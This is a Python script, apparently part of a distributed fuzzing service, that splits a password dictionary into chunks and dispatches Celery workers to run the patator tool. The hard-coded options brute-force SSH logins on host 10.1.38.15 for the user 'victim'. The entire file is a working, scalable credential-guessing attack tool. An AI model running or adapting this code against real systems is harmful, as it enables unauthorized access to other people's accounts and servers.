#!/usr/bin/python
from .tasks import fuzzer
from celery import uuid
from celery.result import AsyncResult

import os
import requests
import time

def start_fuzzing(dict_path, divide_number):
    fuzzer_container = "registry:443/patator:latest"
    fuzzer_start = "python2 -W ignore patator.py"
    fuzzer_options = "ssh_login host=10.1.38.15 user=victim password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'"
    
    upload_dict_url = "http://backend:5000/uploader"
    remove_dict_url = "http://backend:5000/remover"
    
    result_id_list = []
    taskid_list = []
    output = ""

    with open(dict_path) as f:
        content=f.readlines()

    dictLength=len(content)
    partStartIndex=0
    partEndIndex=divide_number if divide_number < dictLength else dictLength
    dictExceed=False

    while True:
        taskid = uuid()
        taskid_list.append(taskid)
        with open('dict/'+str(taskid), 'w') as f:
            for i in range(partStartIndex, partEndIndex):
                f.write(content[i])
        partStartIndex=partEndIndex
        partEndIndex=partEndIndex+divide_number
        if partEndIndex>dictLength:
            partEndIndex=dictLength
            dictExceed=True

        files = {'file': open('dict/'+str(taskid), 'rb')}
        requests.post(upload_dict_url, files=files)
        os.remove('dict/'+str(taskid))

        result = fuzzer.delay(taskid, fuzzer_container, fuzzer_start, fuzzer_options)
        result_id_list.append(result.id)
        
        if (dictExceed):
            break

    while not result.ready():
        time.sleep(1)
    
    for taskid in taskid_list:
        print (remove_dict_url+'/'+str(taskid))
        requests.get(remove_dict_url+'/'+str(taskid))

    for result_id in result_id_list:
        ares = AsyncResult(result_id,app=fuzzer)
        output = output+ares.get()

    return output
